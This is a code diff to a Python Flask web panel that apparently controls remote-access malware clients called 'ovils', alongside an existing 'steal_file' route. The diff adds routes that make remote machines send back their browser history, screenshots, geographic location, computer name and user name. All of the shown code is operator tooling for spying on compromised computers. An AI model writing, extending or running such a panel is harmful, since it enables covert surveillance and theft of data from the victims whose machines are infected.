@@ -530,15 +530,55 @@ def steal_file(ip):
 @app.route("/ovil/<ip>/other_info/")
 @handle_errors
 def other_info(ip):
+    params = {}
     if screenshot_taken[0]:
         if screenshot_taken[1]:
             path = Path("uploads") / Path(find_last_file(UPLOAD_DEFAULT_PATH, prefix="screenshot")).name
             path = "/" + str(path).replace("\\", "/")
             screenshot_taken[0], screenshot_taken[1] = False, False
-            return render_template("other_info.html", screenshot=True, path=path)
-        screenshot_taken[0], screenshot_taken[1] = False, False
-        return render_template("other_info.html", screenshot=True, msg=screenshot_taken[2])
-    return render_template("other_info.html")
+            params["screenshot"] = True
+            params["path"] = path
+        else:
+            screenshot_taken[0], screenshot_taken[1] = False, False
+            params["screenshot"] = True
+            params["msg"] = screenshot_taken[2]
+    history = get_history(ip)
+    if isinstance(history, list):
+        params["history"] = True
+        params["history_data"] = history
+    elif isinstance(history, str):
+        params["history"] = False
+        params["history_error"] = history
+    else:
+        params["history"] = False
+        params["history_error"] = "Unknown Error"
+    return render_template("other_info.html", **params)
+
+
+@handle_errors
+@handle_disconnection
+def get_history(ip):
+    ovil = ovils[ovils.index(ip)]
+    result = ovil.send_command("get_browser_info_str", [])
+    try:
+        ls = result.split("\n")
+        ls2 = []
+        for info in ls:
+            if not info:
+                continue
+            date, site = info.split(", ")
+            site = site.split('?')[0]
+            ls2.append((date, site))
+    except (ValueError, IndexError, TypeError):
+        return result
+    final_ls = []
+    for i in range(len(ls2)):
+        date, site = ls2[i]
+        if i % 2 == 0:
+            final_ls.append([date, site, None, None])
+        else:
+            final_ls[-1][2], final_ls[-1][3] = date, site
+    return final_ls
 
 
 @app.route("/ovil/<ip>/other_info/screenshot/")
@@ -548,6 +588,7 @@ def screenshot(ip):
     screenshot_taken[1] = False
     screenshot_taken[2] = take_screenshot(ip)
     return redirect(url_for(f"other_info", ip=ip))
+
 
 @handle_errors
 @handle_disconnection
@@ -560,6 +601,30 @@ def take_screenshot(ip) -> str:
         return "Unknown Error"
     screenshot_taken[1], msg = get_file(ovil, DEFAULT_SCREENSHOT_NAME)
     return msg
+
+
+@app.route("/ovil/<ip>/other_info/FindLocation/")
+@handle_errors
+@handle_disconnection
+def find_location(ip):
+    ovil = ovils[ovils.index(ip)]
+    return ovil.send_command("get_location", [])
+
+
+@app.route("/ovil/<ip>/other_info/GetComputer/")
+@handle_errors
+@handle_disconnection
+def get_computer(ip):
+    ovil = ovils[ovils.index(ip)]
+    return ovil.send_command("get_computer", [])
+
+
+@app.route("/ovil/<ip>/other_info/GetUser/")
+@handle_errors
+@handle_disconnection
+def get_user(ip):
+    ovil = ovils[ovils.index(ip)]
+    return ovil.send_command("get_user", [])
 
 
 def main():
